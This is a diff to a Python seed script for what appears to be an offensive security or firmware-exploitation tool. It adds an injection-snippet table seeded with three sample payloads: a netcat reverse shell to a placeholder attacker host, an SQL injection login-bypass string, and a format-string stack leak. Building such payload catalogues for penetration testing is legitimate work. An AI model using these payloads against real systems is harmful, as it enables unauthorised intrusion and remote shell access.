@@ -2,7 +2,7 @@ import datetime
 import json
 from sqlalchemy import create_engine
 from sqlalchemy.orm import sessionmaker
-from app.models.models import Base, Project, Device, Binary, Function, Finding, ExploitChain, Session, AIModel, Wordlist, Payload, Variant, Credential, AttackSurface, HardwareInterface, FirmwareImage, FirmwareAnalysis, RecompilationJob, PayloadSuccessRate
+from app.models.models import Base, Project, Device, Binary, Function, Finding, ExploitChain, Session, AIModel, Wordlist, Payload, Variant, Credential, AttackSurface, HardwareInterface, FirmwareImage, FirmwareAnalysis, RecompilationJob, PayloadSuccessRate, InjectionSnippet
 
 SQLALCHEMY_DATABASE_URL = "sqlite:///./app.db"
 engine = create_engine(SQLALCHEMY_DATABASE_URL, connect_args={"check_same_thread": False})
@@ -130,6 +130,15 @@ def seed():
     # 14. Payload Success Rates
     psr1 = PayloadSuccessRate(payload_id=pld1.id, arch="arm", os="linux", success_count=12, fail_count=2, crash_count=1)
     db.add(psr1)
+    db.commit()
+
+    # 15. Injection Snippets
+    snips = [
+        InjectionSnippet(category="CmdInj", name="Basic Rev Shell", content="; nc -e /bin/sh ATTACKER_IP 4444", description="Classic netcat reverse shell", platform="linux"),
+        InjectionSnippet(category="SQLi", name="Auth Bypass", content="' OR '1'='1", description="Simple tautology for auth bypass", platform="web"),
+        InjectionSnippet(category="FormatStr", name="Stack Leak", content="%x %x %x %x %x %x %x %x", description="Leak stack values using printf vuln", platform="c")
+    ]
+    db.add_all(snips)
     db.commit()
 
     db.close()
